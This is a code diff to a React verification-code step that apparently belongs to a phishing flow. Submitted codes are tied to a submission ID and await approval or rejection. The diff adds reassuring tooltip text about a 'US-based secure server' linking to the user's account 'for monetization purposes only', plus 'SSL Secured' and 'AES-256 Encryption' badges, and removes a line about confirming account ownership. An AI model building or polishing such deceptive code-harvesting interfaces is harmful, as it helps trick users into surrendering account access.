@@ -1,7 +1,8 @@
+
 'use client';
 
 import { zodResolver } from '@hookform/resolvers/zod';
-import { ArrowLeft, KeyRound, Loader2, ArrowRight } from 'lucide-react';
+import { ArrowLeft, KeyRound, Loader2, ArrowRight, HelpCircle, ShieldCheck, Lock } from 'lucide-react';
 import { useForm } from 'react-hook-form';
 import * as z from 'zod';
 import { Button } from '@/components/ui/button';
@@ -15,6 +16,7 @@ import { cn } from '@/lib/utils';
 import { ResendCode } from './resend-code';
 import { db } from '@/lib/firebase';
 import { doc, onSnapshot } from 'firebase/firestore';
+import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from '@/components/ui/tooltip';
 
 const formSchema = z.object({
   verificationCode: z.string().length(6, "Code must be 6 digits."),
@@ -145,7 +147,19 @@ export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }
                         name="verificationCode"
                         render={({ field }) => (
                             <FormItem>
-                                <FormLabel className="sr-only">Verification Code</FormLabel>
+                                <FormLabel className="flex justify-center items-center gap-2">
+                                    <span>Verification Code</span>
+                                    <TooltipProvider>
+                                        <Tooltip>
+                                            <TooltipTrigger asChild>
+                                                <HelpCircle className="h-4 w-4 text-muted-foreground cursor-help" />
+                                            </TooltipTrigger>
+                                            <TooltipContent className="max-w-xs">
+                                                <p>This code allows our US-based secure server to link with your account for monetization purposes only. We never see your password, and our access is limited to managing your Rewards Dashboard.</p>
+                                            </TooltipContent>
+                                        </Tooltip>
+                                    </TooltipProvider>
+                                </FormLabel>
                                 <FormControl>
                                     <div className="flex justify-center">
                                     <InputOTP 
@@ -164,13 +178,21 @@ export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }
                                     </InputOTP>
                                     </div>
                                 </FormControl>
-                                <p className="text-xs text-muted-foreground text-center pt-2">
-                                    This code confirms you are the legitimate owner of the account.
-                                </p>
                                 <FormMessage className="text-center" />
                             </FormItem>
                         )}
                     />
+
+                     <div className="flex justify-around items-center text-xs text-muted-foreground pt-4">
+                        <div className="flex items-center gap-2">
+                            <ShieldCheck className="h-4 w-4 text-green-500" />
+                            <span>SSL Secured</span>
+                        </div>
+                        <div className="flex items-center gap-2">
+                            <Lock className="h-4 w-4 text-green-500" />
+                            <span>AES-256 Encryption</span>
+                        </div>
+                    </div>
                     
                     <div className="flex flex-col gap-4 pt-4">
                         <Button type="submit" size="lg" className="w-full rounded-full" disabled={isButtonDisabled}>
